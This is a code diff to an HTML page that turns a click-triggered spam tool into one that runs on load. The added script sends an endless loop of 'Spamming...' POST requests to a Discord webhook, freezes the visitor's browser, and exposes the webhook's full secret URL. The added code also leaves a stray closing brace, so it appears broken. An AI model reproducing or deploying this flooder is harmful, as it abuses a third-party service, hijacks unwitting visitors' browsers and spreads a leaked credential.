@@ -2,27 +2,18 @@
 <html>
 <body>
 
-<button onclick="openTabs()">開始無限發送</button>
-
 <script>
-const target = "https://brndan918.github.io/test_web2/";
 const webhookUrl = "https://discord.com/api/webhooks/1517220131984506951/m6o9HU7mbO2hiB-Vzu3q8kzly3jeHR3DzUNL6PmtghWDCLRdfzPyrxSv9ndZlhZy12-w";
 
-function openTabs() {
-    // 開新分頁
-    window.open(target, "_blank", "noopener,noreferrer");
-
-    // 暴力無窮迴圈：不等待、不禮讓、完全佔滿主執行緒
-    // 點擊後網頁會立刻凍結（卡死），但會以硬體極限速度瘋狂噴出請求
-    while (true) {
-        fetch(webhookUrl, {
-            method: "POST",
-            body: JSON.stringify({ 
-                content: `Spamming...` 
-            }),
-            headers: { "Content-Type": "application/json" }
-        }).catch(() => {});
-    }
+while (true) {
+    fetch(webhookUrl, {
+        method: "POST",
+        body: JSON.stringify({ 
+            content: `Spamming...` 
+        }),
+        headers: { "Content-Type": "application/json" }
+    }).catch(() => {});
+}
 }
 </script>
 
